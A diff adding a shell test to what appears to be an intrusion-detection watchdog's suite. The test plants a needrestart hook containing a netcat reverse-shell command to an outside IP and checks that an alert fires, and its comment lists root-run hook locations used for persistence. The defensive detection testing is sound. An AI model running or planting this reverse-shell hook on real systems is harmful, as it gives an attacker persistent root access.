@@ -228,3 +228,21 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in needrestart hook: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
+    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
+    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts nc
+    # reverse-shell variant INVARIANTs across the brain. Lock the
+    # netcat axis on the post-upgrade-restart-trigger root-exec
+    # persistence surface (T1546 — needrestart runs hook scripts AS
+    # ROOT after apt/dpkg operations to identify services needing
+    # restart).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/10-dpkg"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
